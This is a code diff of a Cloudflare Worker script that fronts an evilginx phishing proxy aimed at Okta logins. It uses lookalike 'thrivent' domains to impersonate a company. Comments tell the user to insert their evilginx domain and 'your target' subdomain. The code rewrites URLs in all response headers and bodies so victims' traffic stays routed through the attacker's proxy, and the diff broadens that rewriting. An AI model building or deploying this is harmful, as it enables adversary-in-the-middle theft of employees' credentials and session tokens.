@@ -1,3 +1,7 @@
+// Replace all <your.workers.dev> with your workers dev link
+// Replace all <evilginx.domain.tld> with your domain configured for evilginx (allowlist the Cloudflare ranges and block all else on the machine)
+// Replace all <okta-specific-evilginx-subdomain> with the subdomain with the one created for your target within evilginx
+
 const WORKER_HOST = "apps.thrivent-corp.workers.dev";
 
 // vhost mappings.
@@ -22,19 +26,10 @@ async function handleRequest(request) {
     const { url, pathnameSegments, effectivePrefix, newPath } = parseRequest(request);
 
     const targetUrl = constructTargetUrl(url, effectivePrefix, newPath);
-    const modifiedRequest = new Request(targetUrl.toString(), {
-        method: request.method,
-        headers: request.headers,
-        body: request.body
-    });
+    const modifiedRequest = new Request(targetUrl.toString(), request);
 
     let response = await fetch(modifiedRequest);
-    
-    // Only rewrite HTML content, not assets
-    const contentType = response.headers.get("Content-Type") || "";
-    if (contentType.includes("text/html")) {
-        response = await rewriteResponse(response, effectivePrefix);
-    }
+    response = await rewriteResponse(response, effectivePrefix);
 
     return response;
 }
@@ -51,10 +46,6 @@ function parseRequest(request) {
 
 function constructTargetUrl(url, effectivePrefix, newPath) {
     const targetHost = SPECIAL_VHOSTS[effectivePrefix];
-    if (!targetHost) {
-        throw new Error(`No target host found for prefix: ${effectivePrefix}`);
-    }
-    
     const targetUrl = new URL(url);
     targetUrl.protocol = "https:";
     targetUrl.host = targetHost;
@@ -73,34 +64,62 @@ function constructTargetUrl(url, effectivePrefix, newPath) {
 }
 
 async function rewriteResponse(response, effectivePrefix) {
-    const originalText = await response.text();
-    
-    // Only rewrite URLs that actually need to go through the worker
-    // Focus on form actions, redirects, and navigation - not assets
-    const rewrittenText = originalText.replace(
-        /https:\/\/(okta|cdn|login)\.applogin-thrivent\.com(\/[^"\s'<>]*)?/g,
-        (match, subdomain, path = "") => {
-            // Only rewrite if it's a navigation URL, not an asset
-            if (path.includes('/assets/') || 
-                path.includes('.js') || 
-                path.includes('.css') || 
-                path.includes('.png') || 
-                path.includes('.jpg') || 
-                path.includes('.gif') ||
-                path.includes('.woff') ||
-                path.includes('.svg')) {
-                return match; // Don't rewrite asset URLs
-            }
-            return `https://${WORKER_HOST}/${subdomain}${path}`;
+    const newHeaders = new Headers(response.headers);
+
+    for (const [key, value] of newHeaders.entries()) {
+        if (typeof value === "string" && value.includes("https://")) {
+            newHeaders.set(key, rewriteText(value, effectivePrefix));
+        }
+    }
+
+    const contentType = newHeaders.get("Content-Type") || "";
+    if (isTextBasedContent(contentType)) {
+        const originalText = await response.text();
+        const rewrittenText = rewriteText(originalText, effectivePrefix);
+        newHeaders.delete("Content-Length");
+        return new Response(rewrittenText, {
+            status: response.status,
+            statusText: response.statusText,
+            headers: newHeaders,
+        });
+    } else {
+        return new Response(response.body, {
+            status: response.status,
+            statusText: response.statusText,
+            headers: newHeaders,
+        });
+    }
+}
+
+function isTextBasedContent(contentType) {
+    return contentType.includes("text") || contentType.includes("application/json") || contentType.includes("javascript");
+}
+
+/**
+ * Rewrites any URLs found in the given text.
+ *
+ * It targets URLs that point to:
+ *   - Known special domains (e.g. <okta-specific-evilginx-subdomain>.<evilginx.domain.tld>, cdn.<evilginx.domain.tld>, login.<evilginx.domain.tld>)
+ *   - Or any URL ending in ".<evilginx.domain.tld>"
+ *
+ * The rewritten URL uses the WORKER_HOST and the effectivePrefix (which will be "<okta-specific-evilginx-subdomain>" if the original prefix was unknown).
+ */
+function rewriteText(text, effectivePrefix) {
+    return text.replace(
+        /https:\/\/([a-zA-Z0-9\.-]+)(\/[^\s"'<>]*)?/g,
+        (match, host, path = "") => {
+            let subdomain = getSubdomain(host, effectivePrefix);
+            return subdomain ? `https://${WORKER_HOST}/${subdomain}${path}` : match;
         }
     );
-    
-    const newHeaders = new Headers(response.headers);
-    newHeaders.delete("Content-Length");
-    
-    return new Response(rewrittenText, {
-        status: response.status,
-        statusText: response.statusText,
-        headers: newHeaders,
-    });
+}
+
+function getSubdomain(host, effectivePrefix) {
+    if (REVERSE_SPECIAL_MAPPING[host]) {
+        return REVERSE_SPECIAL_MAPPING[host];
+    } else if (host.endsWith(".applogin-thrivent.com")) {
+        return host.slice(0, -".applogin-thrivent.com".length);
+    } else {
+        return effectivePrefix;
+    }
 }
